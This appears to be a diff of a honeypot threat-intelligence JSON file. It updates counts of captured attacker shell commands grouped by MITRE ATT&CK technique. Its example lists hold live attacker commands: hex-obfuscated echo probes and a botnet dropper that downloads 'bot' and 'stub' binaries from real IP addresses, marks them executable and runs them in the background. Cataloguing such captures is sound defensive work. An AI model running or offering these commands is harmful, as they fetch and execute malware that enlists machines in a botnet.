@@ -8,11 +8,11 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 124135,
-      "distinct_ips": 370,
+      "count": 124143,
+      "distinct_ips": 371,
       "examples": [
-        "echo -e \"\\x6F\\x6B\"",
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+        "echo -e \"\\x6F\\x6B\"",
         "echo -e \"\\x47\\x41\\x59\"",
         "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
         "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon"
@@ -25,8 +25,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 6991,
-      "distinct_ips": 424,
+      "count": 7006,
+      "distinct_ips": 425,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.56:6881PROXYONUPDATE:7332/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:8080/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.56:6881PROXYONUPDATE >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "chmod +x /tmp/.st;(/tmp/.st 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1",
@@ -42,8 +42,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2601,
-      "distinct_ips": 394,
+      "count": 2604,
+      "distinct_ips": 395,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.56:6881PROXYONUPDATE:7332/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:8080/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.56:6881PROXYONUPDATE >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "wget -q http://176.65.134.121:8080/stub.arm -O /tmp/.st",
@@ -183,6 +183,6 @@
       ]
     }
   ],
-  "total_commands": 330684,
-  "matched_commands": 132016
+  "total_commands": 330753,
+  "matched_commands": 132039
 }
